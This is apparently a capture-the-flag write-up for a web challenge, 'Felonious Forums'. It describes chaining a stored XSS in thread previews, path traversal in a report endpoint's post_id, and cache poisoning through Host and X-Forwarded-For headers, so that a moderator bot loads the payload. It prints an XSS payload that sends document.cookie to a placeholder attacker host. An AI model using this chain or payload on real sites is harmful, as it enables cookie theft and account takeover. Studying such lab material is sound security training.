### Name: Felonious Forums
#### Difficulty: Medium
#### Category: Web
Description:
> Our threat intelligence has traced a reseller of the GrandMonty Ransomware linked with the Monkey Business group to this illegal forums platform. We need you to investigate the platform to find any security loopholes that can provide us access to the platform.

---

Here's a quick writeup on `Felonious Forums [Web]`

The Preview thread option when you create a thread had an XSS. Also, in the report feature, you can intercept the request and in the `post_id` parameter is vulnerable to path traversal. So you can send input like `6/../../../../someotherpage.html` and it will actually move to `/someotherpage.html`. Now the application caches the response using a cache key which depends on three things:
- Host header
- URL
- X-Forwarded-For OR The client IP
Also, it caches the responses for like 30s.

The `/threads/preview` endpoint is where you see the thread contents in the preview. You can make a GET request to it to view it. When using the preview option, it adds a cachebuster like `?16354215868` at the end of the URL. So the preview URL is something like `/threads/preview?16354215868`. You can make a GET request to the page and it will show you the contents of the preview.

Now, moving to the attack:
- First you need to create a preview of a post that includes the XSS.
	- Include the following payload
		`![test](https://google.com/?"/onerror="fetch('http://ATTACKER-SITE?f=' + document.cookie '')`
- Now you need to preview it. Before making this request, we need to add/modify a few headers. Since the cache key depends on the Host header and the X-Forwarded-For header, we need to change the Host header to `127.0.0.1:1337` and add the X-Forwarded-For header to `127.0.0.1` so that it creates the cache that is valid for the bot (moderator). Now and copy the generated cachebuster value. Let's say `?16845635214684`.
- Finally, we need to send a report request that has the `post_id` as `6/../../../../../../threads/preview?16845635214684`. This will make the bot visit the cached page that includes our XSS. The XSS will send the cookie to our attacker server and we get the flag.